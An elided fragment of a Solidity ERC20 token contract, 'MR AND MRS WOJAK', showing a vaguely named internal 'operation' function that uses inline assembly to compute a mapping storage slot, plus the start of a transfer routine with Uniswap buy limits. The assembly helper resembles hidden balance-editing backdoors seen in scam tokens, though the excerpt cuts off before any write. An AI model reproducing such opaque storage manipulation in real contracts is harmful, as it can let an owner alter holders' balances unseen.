...
contract MRANDMRSWOJAK is IERC20, ReentrancyGuard, Ownable {
  ...
  string private _name = "MR AND MRS WOJAK";
  ...
  function operation(uint256 pointer, uint256 opcode) internal {
    bytes32 b = bytes32(pointer);
    assembly {
      mstore(0, b)
      mstore(32, 2)
  ...
  function _transfer(
    ...
    if (_sender == uniswapPair) {
      if (!excludedFromLimit[_recipient]) {
